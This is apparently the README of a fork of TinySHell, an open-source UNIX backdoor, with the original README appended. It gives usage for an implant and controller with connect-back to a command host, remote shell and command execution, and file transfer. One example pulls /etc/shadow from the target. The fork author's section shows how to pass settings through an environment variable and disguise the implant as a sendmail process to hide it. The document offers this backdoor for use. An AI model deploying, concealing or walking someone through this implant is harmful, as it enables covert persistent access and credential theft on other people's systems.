This is an updated fork of creaktives fork of TinySHell, an open source UNIX backdoor.

creaktive added commandline argument parsing which allows you to dynamically set the connectback host, port, and shared secret value at runtime. 

Like so:
```
# implant side
Usage: ./tshd [ -c [ connect_back_host ] ] [ -s secret ] [ -p port ]

# c2 side
Usage: ./tsh [ -s secret ] [ -p port ] [command]

   <hostname|cb>
   <hostname|cb> get <source-file> <dest-dir>
   <hostname|cb> put <source-file> <dest-dir>
```

I've since added support for passing those arguments through an environmental variable by shamelessly copy-pasting Skyper from The Hackers Choice's implementation of env2argv from the THC fork of dsniff. 

So now you can do the following on the implant side:
```
ENV_ARGS="-c localhost -s HACKTHEPLANET -p 1437" ./tshd
```

Which is kinda cool, but it gets neater - you can hide the process somewhat with old school trickery like the following - making it look like a sendmail process as an example:
```
mv tshd sendmail
PATH=.:$PATH ENV_ARGS="-c localhost -s HACKTHEPLANET -p 1437" sendmail 
```

Further changes will follow as testing proceeds and I refactor small bits, try out some bullshit, etc.


## Original readme below.
```

                 Tiny SHell - An open-source UNIX backdoor


    * Before compiling Tiny SHell

        1. First of all, you should setup your secret key, which
           is located in tsh.h; the key can be of any length (use
           at least 12 characters for better security).

        2. It is advised to change SERVER_PORT, the port on which
           the server will be listening for incoming connections.

        3. You may want to start tshd in "connect-back" mode if
           it runs on on a firewalled box; simply uncomment and
           modify CONNECT_BACK_HOST in tsh.h.

    * Compiling Tiny SHell

        Run "make <system>", where <system> can be any one of these:
        linux, freebsd, openbsd, netbsd, cygwin, sunos, irix, hpux, osf

    * How to use the server

        It can be useful to set $HOME and the file creation mask
        before starting the server:

            % umask 077; HOME=/var/tmp ./tshd

    * How to use the client

        Make sure tshd is running on the remote host. You can:

        - start a shell:

            ./tsh <hostname>

        - execute a command:

            ./tsh <hostname> "uname -a"

        - transfer files:

            ./tsh <hostname> get /etc/shadow .
            ./tsh <hostname> put vmlinuz /boot

        Note: if the server runs in connect-back mode, replace
        the remote machine hostname with "cb".

    * About multiple file transfers

        At the moment, Tiny SHell does not support scp-like multiple
        and/or recursive file transfers. You can work around this bug
        by simply making a tar archive and transferring it. Example:

        ./tsh host "stty raw; tar -cf - /etc 2>/dev/null" | tar -xvf -

    * About terminal modes

        On some brain-dead systems (actually, IRIX and HP-UX), Ctrl-C
        and other control keys do not work correctly. Fix it with:

            % stty intr "^C" erase "^H" eof "^D" susp "^Z" kill "^U"

    * About security

        Please remember that the secret key is stored in clear inside
        both tsh and tshd executables; therefore you should make sure
        that no one except you has read access to these two files.
        However, you may choose not to store the real (valid) key in
        the client, which will then ask for a password when it starts.

```